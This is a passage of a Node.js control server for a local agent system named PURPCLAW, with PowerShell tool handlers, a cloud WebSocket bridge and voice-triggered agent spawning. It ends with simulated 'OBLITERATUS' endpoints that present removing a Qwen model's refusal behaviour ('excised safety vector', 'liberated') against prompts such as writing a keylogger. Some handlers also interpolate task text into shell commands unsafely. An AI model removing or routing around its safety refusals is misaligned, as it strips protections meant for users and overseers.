        var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;
        IntPtr dev; enumerator.GetDefaultAudioEndpoint(0, 1, out dev);
        var endpoint = (IAudioEndpointVolume)Marshal.GetObjectForIUnknown(dev);
        endpoint.SetMasterVolumeLevelScalar(level, System.Guid.Empty);
    }
}
'@ -ErrorAction SilentlyContinue
[Audio]::SetVolume(${vol / 100})
`, 8000);
        return ok(`Volume set to ${vol}%`);
      } catch (e) { return ok(`Volume error: ${e.message}`); }
    }
    case 'zip_create': {
      try {
        await ps(`Compress-Archive -Path '${san(args.source)}' -DestinationPath '${san(args.destination)}' -Force`, 30000);
        const size = fs.existsSync(args.destination) ? (fs.statSync(args.destination).size / 1024).toFixed(1) : '?';
        return ok(`Created: ${args.destination} (${size}KB)`);
      } catch (e) { return ok(`Zip error: ${e.message}`); }
    }
    case 'zip_extract': {
      try {
        const dest = args.destination || path.dirname(args.source);
        await ps(`Expand-Archive -Path '${san(args.source)}' -DestinationPath '${san(dest)}' -Force`, 30000);
        return ok(`Extracted: ${args.source} -> ${dest}`);
      } catch (e) { return ok(`Unzip error: ${e.message}`); }
    }
    case 'install_package': {
      try {
        const mgr = args.manager.toLowerCase();
        const pkg = san(args.packages);
        let cmdStr = null;
        if (mgr === 'pip') cmdStr = `pip install ${pkg} --quiet`;
        else if (mgr === 'npm') cmdStr = `npm install ${pkg}`;
        else if (mgr === 'choco') cmdStr = `choco install ${pkg} -y`;
        else return ok(`Unknown manager: ${mgr}`);
        const { stdout, stderr } = await execAsync(cmdStr, { cwd: args.cwd || 'C:\\Users\\Admin\\Desktop', shell: 'powershell.exe', timeout: 120000 }).catch(e => ({ stdout: '', stderr: e.message }));
        return ok(`${mgr} install ${pkg}:\n${(stdout || stderr || 'Done').substring(0, 3000)}`);
      } catch (e) { return ok(`Install error: ${e.message}`); }
    }
    case 'active_window': {
      try {
        const r = await psScript(`
Add-Type @'
using System;
using System.Runtime.InteropServices;
using System.Text;
public class Win32 {
    [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
    [DllImport("user32.dll")] public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
    [DllImport("user32.dll")] public static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);
    [StructLayout(LayoutKind.Sequential)] public struct RECT { public int Left, Top, Right, Bottom; }
}
'@
$h = [Win32]::GetForegroundWindow()
$sb = New-Object System.Text.StringBuilder 256
[Win32]::GetWindowText($h, $sb, 256) | Out-Null
$pid2 = 0; [Win32]::GetWindowThreadProcessId($h, [ref]$pid2) | Out-Null
$proc = Get-Process -Id $pid2 -ErrorAction SilentlyContinue
$rect = New-Object Win32+RECT; [Win32]::GetWindowRect($h, [ref]$rect) | Out-Null
Write-Output "Title: $($sb.ToString())"
Write-Output "Process: $($proc.ProcessName) (PID: $pid2)"
Write-Output "Position: ($($rect.Left),$($rect.Top)) Size: $($rect.Right-$rect.Left)x$($rect.Bottom-$rect.Top)"
Write-Output "CPU: $([math]::Round($proc.CPU,1))s  Memory: $([math]::Round($proc.WorkingSet64/1MB,1))MB"
`, 8000);
        return ok(`Active Window:\n${r}`);
      } catch (e) { return ok(`Context error: ${e.message}`); }
    }
    case 'system_status': {
      try {
        const ps = `
$cpu = (Get-CimInstance Win32_Processor | Measure-Object -Property LoadPercentage -Average).Average
$gpu = try { (Get-CimInstance Win32_VideoController | Select-Object -First 1).Name } catch { "N/A" }
$mem = Get-CimInstance Win32_OperatingSystem
$freeMem = [math]::Round($mem.FreePhysicalMemory / 1MB, 1)
$totalMem = [math]::Round($mem.TotalVisibleMemorySize / 1MB, 1)
$usedMemPct = [math]::Round((1 - $mem.FreePhysicalMemory / $mem.TotalVisibleMemorySize) * 100, 1)
$uptime = (Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
$uptimeStr = "$($uptime.Days)d $($uptime.Hours)h $($uptime.Minutes)m"
$procs = Get-Process | Sort-Object CPU -Descending | Select-Object -First 5 Name, @{N="CPU(s)";E={[math]::Round($_.CPU,1)}}, @{N="MB";E={[math]::Round($_.WorkingSet64/1MB,1)}}
$disk = Get-CimInstance Win32_LogicalDisk -Filter "DriveType=3"
$net = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Ethernet*","Wi-Fi*" | Select-Object -ExpandProperty IPAddress
$gpuMem = try { $vram = (Get-CimInstance Win32_VideoController | Select-Object -First 1).AdapterRAM; if ($vram) { [math]::Round($vram/1GB, 2).ToString() + " GB VRAM" } else { "Shared" } } catch { "N/A" }
$purpStatus = if($purpProc) {"RUNNING"} else {"idle"}
Write-Output "PURPCLAW System Status"
Write-Output "=========================================="
Write-Output ("CPU: " + $cpu + "% | RAM: " + $usedMemPct + "% (" + $freeMem + "GB free of " + $totalMem + "GB)")
Write-Output ("GPU: " + $gpu)
Write-Output ("VRAM: " + $gpuMem)
Write-Output ("Uptime: " + $uptimeStr)
Write-Output "=========================================="
Write-Output "Disk:"
$disk | ForEach-Object { $dTotalGB = [math]::Round($_.Size/1GB,1); $dFreeGB = [math]::Round($_.FreeSpace/1GB,1); Write-Output ("   " + $_.DeviceID + " " + $dFreeGB + "GB free / " + $dTotalGB + "GB total") }
Write-Output "=========================================="
Write-Output ("Network: " + ($net -join ", "))
Write-Output "=========================================="
Write-Output "Top Processes by CPU:"
$procs | Format-Table -AutoSize | Out-String
Write-Output ("PURPCLAW: " + $purpStatus + " | Tools: " + $TOOLS.Length)
`;
        const result = await psScript(ps, 15000);
        return ok(result);
      } catch (e) { 
        return ok(`System status error: ${e.message}`);
      }
    }
    case 'system_paths': {
      return ok(JSON.stringify({
        desktop: 'C:/Users/Admin/Desktop',
        documents: 'C:/Users/Admin/Documents',
        downloads: 'C:/Users/Admin/Downloads',
        pictures: 'C:/Users/Admin/Pictures',
        music: 'C:/Users/Admin/Music',
        videos: 'C:/Users/Admin/Videos',
        thisPc: 'C:/Users/Admin',
        home: 'C:/Users/Admin',
        root: 'C:/',
        temp: 'C:/Users/Admin/AppData/Local/Temp',
        appData: 'C:/Users/Admin/AppData/Roaming',
        localAppData: 'C:/Users/Admin/AppData/Local',
        purpclaw: 'C:/Users/Admin/Desktop/PURPCLAW',
        drive_c: 'C:/',
        drive_d: 'D:/',
        drive_e: 'E:/',
        drive_g: 'G:/',
        drive_k: 'K:/',
        god_folder: 'E:/god folder',
        worldview: 'E:/god folder/02_ACTIVE_PROJECTS/GOTHAM_3077',
        zamp: 'E:/god folder/ZAMP'
      }, null, 2));
    }
    case 'disk_info': {
      try {
        const ps = `
$disk = Get-CimInstance Win32_LogicalDisk -Filter "DriveType=3"
$disk | ForEach-Object { $dTotalGB = [math]::Round($_.Size/1GB,1); $dFreeGB = [math]::Round($_.FreeSpace/1GB,1); Write-Output ($_.DeviceID + " " + $_.FileSystem + ": " + $dFreeGB + "GB free / " + $dTotalGB + "GB total") }
`;
        const r = await psScript(ps, 8000);
        return ok(r);
      } catch (e) { return ok(`Disk error: ${e.message}`); }
    }
    case 'network_info': {
      try {
        const ps = `
$ipAddr = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Ethernet*","Wi-Fi*" | Select-Object -ExpandProperty IPAddress
$pingResult = Test-Connection -ComputerName 8.8.8.8 -Count 1 -Quiet
$wifiInfo = try { (netsh wlan show interfaces | Select-String "SSID|Signal|State") -join " " } catch { "N/A" }
$adapters = Get-NetAdapter | Where-Object Status -eq "Up" | Select-Object Name, @{N="Speed";E={$_.LinkSpeed}}
Write-Output "Network Status:"
Write-Output ("IP Addresses: " + ($ipAddr -join ", "))
Write-Output ("Internet: " + $(if($pingResult) {"Connected"} else {"No connection"}))
Write-Output ("WiFi: " + $wifiInfo)
Write-Output "Adapters:"
$adapters | Format-Table -AutoSize | Out-String
`;
        const r = await psScript(ps, 8000);
        return ok(r);
      } catch (e) { return ok(`Network error: ${e.message}`); }
    }
    case 'get_weather': {
      try {
        const location = san(args.location || 'London');
        const r = await psScript(`
$w = Invoke-WebRequest -Uri "https://wttr.in/${encodeURIComponent(location)}?format=3" -TimeoutSec 10 -UseBasicParsing
Write-Output $w.Content
`, 15000);
        return ok(r.trim() || `Weather for ${location} unavailable`);
      } catch (e) { return ok(`Weather error: ${e.message}`); }
    }
    case 'search_music': {
      try {
        const query = san(args.query || '');
        if (!query) return ok('Query required');
        return ok(`Music search: "${query}"\n\nOpen browser to: https://music.youtube.com/search?q=${encodeURIComponent(query)}`);
      } catch (e) { return ok(`Music search error: ${e.message}`); }
    }
    case 'play_music': {
      try {
        const query = san(args.query || '');
        if (!query) return ok('Query required');
        // RIP-OUT FIX: was `start chrome "..."` via cmd.exe (leaked).
        // Use trackedSpawn with the URL handler. If the user wants
        // Chrome specifically, they can pre-set the default browser.
        const url = `https://music.youtube.com/search?q=${encodeURIComponent(query)}`;
        trackedSpawn('rundll32', ['url.dll,FileProtocolHandler', url], {
          tag: `play_music(${query})`, timeoutMs: 5_000, windowsHide: true,
        });
        return ok(`Opening YouTube Music: "${query}"`);
      } catch (e) { return ok(`Play music error: ${e.message}`); }
    }
    case 'search_knowledge': {
      try {
        const query = san(args.query || '');
        if (!query) return ok('Query required');
        const r = await psScript(`
$w = Invoke-WebRequest -Uri "https://en.wikipedia.org/w/api.php?action=opensearch&search=${encodeURIComponent(query)}&limit=5&format=json" -TimeoutSec 10 -UseBasicParsing
$data = $w.Content | ConvertFrom-Json
if ($data[1].Count -gt 0) {
  Write-Output "Wikipedia results for '${query}':"
  for ($i = 0; $i -lt $data[1].Count; $i++) { Write-Output "  $($i+1). $($data[1][$i])" }
} else {
  Write-Output "No Wikipedia results for '${query}'"
}
`, 15000);
        return ok(r.trim() || `No results for "${query}"`);
      } catch (e) { return ok(`Knowledge search error: ${e.message}`); }
    }
    case 'search_memory': {
      try {
        const query = (args.query || '').toLowerCase();
        const mem = loadMemory();
        const entries = mem.facts || [];
        const results = entries.filter(e => 
          (e.c && e.c.toLowerCase().includes(query)) ||
          (e.tags && e.tags.some(t => t.toLowerCase().includes(query)))
        );
        if (results.length === 0) return ok(`No memory matches for: ${query}`);
        const out = results.slice(0, 10).map((e, i) => `${i + 1}. ${e.c.substring(0, 200)} (${e.t || 'unknown'})`).join('\n');
        return ok(`Memory matches (${results.length}):\n${out}`);
      } catch (e) { return ok(`Memory search error: ${e.message}`); }
    }
    default: {
      // Not a hand-coded builtin — try the canonical tool registry (permission-gated).
      const TR = getToolRuntime();
      if (TR.registry.has(name)) {
        try {
          const r = await TR.invoke(name, args || {}, { source: 'unified_api' });
          if (r && r.ok === false) return ok(`Tool ${name} denied/failed: ${r.error || r.code || 'error'}`);
          const body = (r && (r.content ?? r.text ?? r.message ?? r.result));
          return ok(typeof body === 'string' ? body : JSON.stringify(body ?? r));
        } catch (e) { return ok(`Tool ${name} error: ${e.message}`); }
      }
      return ok(`Unknown tool: ${name}`);
    }
  }
}

async function handleRpc(req) {
  const { id, method, params } = req;
  switch (method) {
    case 'initialize': return { jsonrpc: '2.0', id, result: { protocolVersion: '2024-11-05', capabilities: { tools: { listChanged: false } }, serverInfo: { name: 'purpclaw-v7.0', version: '7.0.0' } } };
    case 'initialized': return { jsonrpc: '2.0', id, result: {} };
    case 'notifications/initialized': return null;
    case 'tools/list':
      loadDynamicSkills();
      console.log(`[BRIDGE] ${TOOLS.length} tools`);
      return { jsonrpc: '2.0', id, result: { tools: TOOLS } };
    case 'tools/call': {
      const { name, arguments: a } = params || {};
      if (!name) return { jsonrpc: '2.0', id, error: { code: -32602, message: 'No tool' } };
      const res = await executeTool(name, a || {});
      const slowTools = ['browser_open', 'browser_click', 'browser_navigate', 'mouse_click', 'find_and_click'];
      if (slowTools.includes(name)) await new Promise(r => setTimeout(r, 800));
      return { jsonrpc: '2.0', id, result: res };
    }
    case 'ping': return { jsonrpc: '2.0', id, result: {} };
    default: return { jsonrpc: '2.0', id, error: { code: -32601, message: `Unknown: ${method}` } };
  }
}

let ws = null, hb = null, rc = null, reconnectAttempts = 0;
let deadConnectionTimer = null;

function connectWS() {
  if (rc) clearTimeout(rc);
  if (deadConnectionTimer) { clearTimeout(deadConnectionTimer); deadConnectionTimer = null; }
  if (ws) { try { ws.terminate(); } catch (_) {} ws = null; }

  reconnectAttempts++;
  console.log(`[WS] Connecting to Xiaozhi cloud... (attempt ${reconnectAttempts})`);
  ws = new WebSocket(XIAOZHI_WS_URL);

  ws.on('open', () => {
    reconnectAttempts = 0;
    console.log('[WS] Connected to Xiaozhi cloud');
    if (hb) clearInterval(hb);
    hb = setInterval(() => { if (ws?.readyState === WebSocket.OPEN) ws.ping(); }, 25000);
  });

  ws.on('message', async (data) => {
    try {
      const raw = data.toString();
      let parsed = null;
      try { parsed = JSON.parse(raw); } catch (_) { parsed = {}; }

      // Handle MCP JSON-RPC protocol messages
      if (parsed.method && parsed.jsonrpc === '2.0') {
        const resp = await handleRpc(parsed);
        if (resp && ws?.readyState === WebSocket.OPEN) {
          ws.send(JSON.stringify(resp));
        }
        return;
      }

      // Handle voice commands from ball (proprietary protocol)
      if (parsed.type === 'voice_command' || parsed.type === 'voice_text' || parsed.text || parsed.command) {
        const command = parsed.text || parsed.command || parsed.content;
        if (command) {
          console.log('[BALL] Voice command:', command.substring(0, 100));
          broadcast({ type: 'ball_voice_command', command, timestamp: new Date().toISOString() });

          if (AgentTower && AgentTower.broadcast) {
            AgentTower.broadcast({ type: 'ball_voice_command', command, timestamp: new Date().toISOString() });
          }

          // Check for explicit spawn commands first
          const agentMatch = command.match(/spawn (\w+)|agent (\w+)|launch (\w+)/i);
          if (agentMatch) {
            const agentName = agentMatch[1] || agentMatch[2] || agentMatch[3];
            if (AgentTower && AgentTower.spawnAgent) {
              AgentTower.spawnAgent(agentName.toLowerCase(), command);
              broadcast({ type: 'ball_spawn_request', agentName, command, timestamp: new Date().toISOString() });
            }
          } else {
            // Auto-spawn relevant agents based on keywords in the command
            const lowerCmd = command.toLowerCase();
            const autoSpawn = [];

            if (lowerCmd.includes('code') || lowerCmd.includes('build') || lowerCmd.includes('implement') || lowerCmd.includes('write')) {
              autoSpawn.push('robot', 'bee', 'dragon');
            }
            if (lowerCmd.includes('security') || lowerCmd.includes('scan') || lowerCmd.includes('audit') || lowerCmd.includes('protect')) {
              autoSpawn.push('ghost', 'owl', 'guardian');
            }
            if (lowerCmd.includes('data') || lowerCmd.includes('analyze') || lowerCmd.includes('research') || lowerCmd.includes('find')) {
              autoSpawn.push('duck', 'spider', 'scientist');
            }
            if (lowerCmd.includes('test') || lowerCmd.includes('qa') || lowerCmd.includes('check') || lowerCmd.includes('verify')) {
              autoSpawn.push('cactus', 'turtle', 'ghost');
            }
            if (lowerCmd.includes('manage') || lowerCmd.includes('coordinate') || lowerCmd.includes('plan') || lowerCmd.includes('organize')) {
              autoSpawn.push('wolf', 'penguin', 'owl');
            }
            if (lowerCmd.includes('test') || lowerCmd.includes('run') || lowerCmd.includes('execute')) {
              autoSpawn.push('mantis', 'shark');
            }

            // Spawn up to 3 matching agents
            for (const agentName of autoSpawn.slice(0, 3)) {
              if (AgentTower && AgentTower.spawnAgent) {
                const result = await AgentTower.spawnAgent(agentName, `Voice task: ${command.substring(0, 50)}`, {});
                if (result.success) {
                  broadcast({ type: 'ball_auto_spawn', agentName, command: command.substring(0, 50), timestamp: new Date().toISOString() });
                }
              }
            }
          }
        }
        return;
      }

      // Handle query messages
      if (parsed.type === 'query') {
        if (parsed.query === 'tower_status' || parsed.query === 'status') {
          if (ws && ws.readyState === WebSocket.OPEN) {
            const status = AgentTower.getAgentStatus();
            ws.send(JSON.stringify({ type: 'status_response', data: status }));
          }
        }
        return;
      }

      // If we get here, it's an unknown message type - log it
      if (parsed.method !== 'ping') {
        console.log('[WS] Unknown message type:', raw.substring(0, 100));
      }
    } catch (e) { console.error('[WS] ERR:', e.message); }
  });

  ws.on('close', c => {
    console.log(`[WS] Disconnected (${c})`);
    if (hb) clearInterval(hb);
    recon();
  });

  ws.on('error', e => {
    console.error(`[WS] ERR: ${e.message}`);
    recon();
  });
}

function recon() {
  if (rc) clearTimeout(rc);
  // Exponential backoff: 1s, 2s, 4s, 8s, max 10s
  const delay = Math.min(1000 * Math.pow(2, reconnectAttempts - 1), 10000);
  console.log(`[WS] Reconnecting in ${delay / 1000}s... (attempt ${reconnectAttempts + 1})`);
  rc = setTimeout(connectWS, delay);
}

// DEPRECATED: connectBall merged into connectWS - both protocols now handled on single connection
// Keeping function for backwards compatibility but it's a no-op
function connectBall() {
  console.log('[BALL] Using unified WS connection (connectBall deprecated)');
  AgentTower.connectToBall(XIAOZHI_WS_URL);
}

function scheduleBallReconnect() {}

function startLocalTcpServer() {
  const LOCAL_CMD_PORT = 7778;
  const server = net.createServer((socket) => {
    let buffer = '';
    socket.on('data', async (data) => {
      buffer += data.toString();
      let newline = null;
      while ((newline = buffer.indexOf('\n')) !== -1) {
        const line = buffer.slice(0, newline).trim();
        buffer = buffer.slice(newline + 1);
        if (!line) continue;
        try {
          const cmd = JSON.parse(line);
          console.log('[TCP] <-', JSON.stringify(cmd).substring(0, 100));
          const resp = await handleRpc(cmd);
          if (resp) {
            socket.write(JSON.stringify(resp) + '\n');
            console.log('[TCP] ->', JSON.stringify(resp).substring(0, 100));
          }
        } catch (e) {
          console.error('[TCP] ERR:', e.message);
          try { socket.write(JSON.stringify({ jsonrpc: '2.0', error: { code: -32603, message: e.message } }) + '\n'); } catch (_) {}
        }
      }
    });
    socket.on('error', (e) => { if (e.code !== 'ECONNRESET') console.error('[TCP] socket err:', e.message); });
  });
  server.on('error', (e) => { if (e.code === 'EADDRINUSE') console.log('[TCP] Port 7778 in use'); else console.error('[TCP] server error:', e.message); });
  server.listen(LOCAL_CMD_PORT, '127.0.0.1', () => console.log(`[TCP] Listening on 127.0.0.1:${LOCAL_CMD_PORT}`));
}

let bridgeWs = null;

function connectToBridge() {
  try {
    bridgeWs = net.createConnection(7778, '127.0.0.1', () => {
      state.sammyStatus = 'ready';
      console.log('[CONTROL API] Connected to bridge');
    });
    bridgeWs.on('data', (data) => {
      try { const msg = JSON.parse(data.toString()); handleBridgeMessage(msg); } catch (e) {}
    });
    bridgeWs.on('close', () => {
      state.sammyStatus = 'connecting';
      console.log('[CONTROL API] Bridge disconnected, reconnecting...');
      setTimeout(connectToBridge, 2000);
    });
    bridgeWs.on('error', () => { state.sammyStatus = 'error'; });
  } catch (e) {
    state.sammyStatus = 'error';
    setTimeout(connectToBridge, 2000);
  }
}

function handleBridgeMessage(msg) {
  const entry = { timestamp: new Date().toISOString(), type: msg.type || 'unknown', data: msg };
  state.logs.unshift(entry);
  if (state.logs.length > state.maxLogs) state.logs.pop();
  // Broadcast to live subscribers
  for (const fn of logSubscribers) {
    try { fn(entry); } catch {}
  }
  if (msg.type === 'tool_call') state.sammyCurrentTask = msg.name;
  else if (msg.type === 'tool_result' || msg.type === 'error') state.sammyCurrentTask = null;
  if (msg.type === 'swarm_spawn' || msg.type === 'swarm_result') state.swarmAgents[msg.agentId || msg.agent] = { ...msg, timestamp: new Date().toISOString() };
}

function sendToBridge(msg) {
  if (bridgeWs && !bridgeWs.destroyed) {
    bridgeWs.write(JSON.stringify(msg) + '\n');
    console.log(`[CONTROL API] -> Bridge: ${JSON.stringify(msg).substring(0, 100)}`);
  } else console.log(`[CONTROL API] Bridge write FAILED - not connected`);
}

function broadcast(event) {
  const data = `data: ${JSON.stringify(event)}\n\n`;
  state.sseClients.forEach(clientInfo => {
    try { clientInfo.res.write(data); clientInfo.lastHeartbeat = Date.now(); }
    catch (e) { state.sseClients = state.sseClients.filter(c => c !== clientInfo); }
  });
}

function spawnDivisionAgent(division, task, agentName = null) {
  const agentId = `${division}-${Date.now()}-${Math.random().toString(36).substring(2, 6)}`;
  let command = '', args = [];
  switch (division) {
    case 'AI Research': command = 'py'; args = ['-c', `print("AI Research agent working on: ${task}")`]; break;
    case 'Media Ops': command = 'ffmpeg'; args = ['-version']; break;
    case 'Security': command = 'powershell'; args = ['-Command', `Write-Host "Security scan: ${task}"`]; break;
    case 'Data Mining': command = 'node'; args = ['-e', `console.log("Data mining: ${task}")`]; break;
    case 'Engineering': command = 'git'; args = ['status']; break;
    case 'Design': command = 'py'; args = ['-c', `print("Design task: ${task}")`]; break;
    case 'Management': command = 'cmd'; args = ['/c', 'echo', `Management: ${task}`]; break;
    case 'Infrastructure': command = 'powershell'; args = ['-Command', `Get-Service | Select-Object -First 1`]; break;
    default: command = 'cmd'; args = ['/c', 'echo', `Agent ${division}: ${task}`];
  }
  try {
    const proc = spawn(command, args, { stdio: ['pipe', 'pipe', 'pipe'], shell: false });
    const pid = proc.pid;
    state.activeProcesses[pid] = { agentId, division, task, startTime: new Date().toISOString(), process: proc };
    proc.stdout.on('data', (data) => {
      const output = data.toString().trim();
      if (output) {
        state.logs.unshift({ timestamp: new Date().toISOString(), type: 'agent_output', data: { agentId, division, output } });
        if (state.logs.length > state.maxLogs) state.logs.pop();
        broadcast({ type: 'agent_output', agentId, division, output, timestamp: new Date().toISOString() });
        if (AgentTower && AgentTower.broadcast) {
          AgentTower.broadcast({ type: 'agent_output', agentId, division, output, timestamp: new Date().toISOString() });
        }
      }
    });
    proc.stderr.on('data', (data) => {
      const error = data.toString().trim();
      if (error) {
        state.logs.unshift({ timestamp: new Date().toISOString(), type: 'agent_error', data: { agentId, division, error } });
        if (state.logs.length > state.maxLogs) state.logs.pop();
        broadcast({ type: 'agent_error', agentId, division, error, timestamp: new Date().toISOString() });
        if (AgentTower && AgentTower.broadcast) {
          AgentTower.broadcast({ type: 'agent_error', agentId, division, error, timestamp: new Date().toISOString() });
        }
      }
    });
    proc.on('close', (code) => {
      delete state.activeProcesses[pid];
      state.logs.unshift({ timestamp: new Date().toISOString(), type: 'agent_exit', data: { agentId, division, exitCode: code } });
      if (state.logs.length > state.maxLogs) state.logs.pop();
      broadcast({ type: 'agent_exit', agentId, division, exitCode: code, timestamp: new Date().toISOString() });
      if (AgentTower && AgentTower.broadcast) {
        AgentTower.broadcast({ type: 'agent_exit', agentId, division, exitCode: code, timestamp: new Date().toISOString() });
      }
    });
    state.swarmAgents[agentId] = { id: agentId, name: agentName, division, status: 'working', currentTask: task, pid, startTime: new Date().toISOString() };
    const spawnEntry = { timestamp: new Date().toISOString(), type: 'swarm_spawn', data: { agentId, name: agentName, division, task } };
    state.logs.unshift(spawnEntry);
    if (state.logs.length > state.maxLogs) state.logs.pop();
    broadcast({ type: 'swarm_spawn', agentId, name: agentName, division, task, timestamp: new Date().toISOString() });
    if (AgentTower && AgentTower.broadcast) {
      AgentTower.broadcast({ type: 'swarm_spawn', agentId, name: agentName, division, task, timestamp: new Date().toISOString() });
    }
    return agentId;
  } catch (e) { console.error(`Failed to spawn agent for ${division}:`, e); return null; }
}

function killAgent(agentId) {
  for (const [pid, info] of Object.entries(state.activeProcesses)) {
    if (info.agentId === agentId) {
      try { info.process.kill(); delete state.activeProcesses[pid]; delete state.swarmAgents[agentId]; broadcast({ type: 'swarm_kill', agentId, timestamp: new Date().toISOString() }); if (AgentTower && AgentTower.broadcast) { AgentTower.broadcast({ type: 'swarm_kill', agentId, timestamp: new Date().toISOString() }); } return true; }
      catch (e) { console.error(`Failed to kill agent ${agentId}:`, e); return false; }
    }
  }
  return false;
}

function parseBody(req) {
  return new Promise((resolve, reject) => {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => { try { resolve(body ? JSON.parse(body) : {}); } catch (e) { reject(new Error('Invalid JSON')); } });
    req.on('error', reject);
  });
}

function sendJson(res, status, data) { res.writeHead(status, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' }); res.end(JSON.stringify(data, null, 2)); }
function sendText(res, status, text) { res.writeHead(status, { 'Content-Type': 'text/plain', 'Access-Control-Allow-Origin': '*' }); res.end(text); }

function proxyToGuardian(req, res, path, method) {
  const options = { hostname: 'localhost', port: 7784, path, method, headers: { 'Content-Type': 'application/json', ...req.headers } };
  const proxyReq = http.request(options, (proxyRes) => {
    let data = '';
    proxyRes.on('data', (chunk) => { data += chunk; });
    proxyRes.on('end', () => { res.writeHead(proxyRes.statusCode, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' }); res.end(data); });
  });
  proxyReq.on('error', (err) => { console.error('GUARDIAN proxy error:', err); sendJson(res, 502, { error: 'Security service unavailable', message: err.message }); });
  if (req.method === 'POST' || req.method === 'PUT') {
    let body = '';
    req.on('data', (chunk) => { body += chunk; proxyReq.write(chunk); });
    req.on('end', () => { proxyReq.end(); });
  } else proxyReq.end();
}

const server = http.createServer(async (req, res) => {
  const parsedUrl = url.parse(req.url, true);
  const pathname = parsedUrl.pathname;
  const method = req.method;

  if (method === 'OPTIONS') { res.writeHead(204, { 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Methods': 'GET,POST,DELETE', 'Access-Control-Allow-Headers': 'Content-Type,Authorization' }); res.end(); return; }

  // ── API Key auth (only for mutating endpoints when configured) ─────
  if (AUTH_REQUIRED && MUTATING_METHODS.has(method)) {
    const auth = (req.headers.authorization || '').replace(/^Bearer\s+/i, '');
    if (auth !== API_KEY) {
      return sendJson(res, 401, { error: 'Unauthorized', message: 'Set PURPCLAW_API_KEY in .env or pass Authorization: Bearer <key>' });
    }
  }

  if (pathname === '/api/stream' && method === 'GET') {
    res.writeHead(200, { 'Content-Type': 'text/event-stream', 'Cache-Control': 'no-cache', 'Connection': 'keep-alive', 'Access-Control-Allow-Origin': '*' });
    res.write(`data: ${JSON.stringify({ type: 'connected', state: { sammyStatus: state.sammyStatus, currentTask: state.sammyCurrentTask } })}\n\n`);
    const clientInfo = { res, lastHeartbeat: Date.now() };
    state.sseClients.push(clientInfo);
    const heartbeatInterval = setInterval(() => {
      if (Date.now() - clientInfo.lastHeartbeat > 60000) { clearInterval(heartbeatInterval); state.sseClients = state.sseClients.filter(c => c !== clientInfo); try { res.end(); } catch (e) {} }
      else { try { res.write(': heartbeat\n\n'); } catch (e) { clearInterval(heartbeatInterval); state.sseClients = state.sseClients.filter(c => c !== clientInfo); } }
    }, 30000);
    req.on('close', () => { clearInterval(heartbeatInterval); state.sseClients = state.sseClients.filter(c => c !== clientInfo); });
    return;
  }
  try {
    // ========== OBLITERATUS SIMULATION ENDPOINTS ==========
    if (pathname === '/api/obliteratus/status' && method === 'GET') {
      return sendJson(res, 200, {
        status: state.obliteratusStatus || 'idle',
        model: state.obliteratusModel || 'qwen-2.5-0.5B-unmodified',
        ratio: state.obliteratusRatio || 0.0,
        conceptErasure: state.obliteratusConceptErasure || false,
        refusalRemoved: (state.obliteratusRatio || 0) > 0,
        refusalVariance: (state.obliteratusRatio || 0) > 0 ? Math.max(0.01, 1 - state.obliteratusRatio) : 1.0,
      });
    }

    if (pathname === '/api/obliteratus/scan' && method === 'POST') {
      state.obliteratusStatus = 'scanning';
      broadcast({ type: 'obliteratus_event', status: 'scanning', timestamp: new Date().toISOString() });
      
      const scanPoints = [
        { x: 0.82, y: 0.69, label: 'Prompt: Write a keylogger', type: 'refusal' },
        { x: 0.76, y: 0.74, label: 'Prompt: Exploit local stack buffer overflow', type: 'refusal' },
        { x: 0.88, y: 0.61, label: 'Prompt: Generate reverse shell payload', type: 'refusal' },
        { x: 0.71, y: 0.81, label: 'Prompt: Bypass OAuth flow via token substitution', type: 'refusal' },
        { x: 0.85, y: 0.55, label: 'Prompt: Enumerate vulnerable ports silently', type: 'refusal' },
        { x: -0.65, y: -0.44, label: 'Prompt: List available python packages', type: 'harmless' },
        { x: -0.58, y: -0.51, label: 'Prompt: Build simple websocket chat server', type: 'harmless' },
        { x: -0.73, y: -0.38, label: 'Prompt: Parse CSV database entries to JSON', type: 'harmless' },
        { x: -0.69, y: -0.49, label: 'Prompt: Format help cards for command-line tool', type: 'harmless' },
        { x: -0.61, y: -0.59, label: 'Prompt: Render custom CSS glassmorphism styles', type: 'harmless' }
      ];

      setTimeout(() => {
        state.obliteratusStatus = 'profiled';
        broadcast({ type: 'obliteratus_event', status: 'profiled', scanPoints, timestamp: new Date().toISOString() });
      }, 1500);

      return sendJson(res, 200, { ok: true, status: 'scanning' });
    }

    if (pathname === '/api/obliteratus/abliterate' && method === 'POST') {
      try {
        const body = await parseBody(req);
        const ratio = parseFloat(body.ratio ?? 0.85);
        const conceptErasure = !!body.conceptErasure;

        state.obliteratusStatus = 'abliterating';
        broadcast({ type: 'obliteratus_event', status: 'abliterating', timestamp: new Date().toISOString() });

        setTimeout(() => {
          state.obliteratusStatus = 'abliterated';
          state.obliteratusModel = ratio > 0 ? 'qwen-2.5-0.5B-liberated' : 'qwen-2.5-0.5B-unmodified';
          state.obliteratusRatio = ratio;
          state.obliteratusConceptErasure = conceptErasure;

          state.logs.unshift({
            id: 'log_' + Date.now() + Math.random().toString(36).substring(2, 6),
            timestamp: new Date().toLocaleTimeString('en-US', { hour12: false }),
            topic: 'agent.completed',
            level: 'agent',
            source: 'OBLITERATUS',
            agentName: 'OBLITERATUS',
            message: `Excised safety vector at ${Math.round(ratio*100)}% ratio via orthogonal projection.`
          });

          broadcast({
            type: 'obliteratus_event',
            status: 'abliterated',
            ratio,
            conceptErasure,
            timestamp: new Date().toISOString()
          });
        }, 1500);

        return sendJson(res, 200, { ok: true, status: 'abliterating' });
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    if (pathname === '/api/obliteratus/chat' && method === 'POST') {
      try {
        const body = await parseBody(req);
        const prompt = body.prompt || '';
        const ratio = parseFloat(body.ratio ?? 0.85);

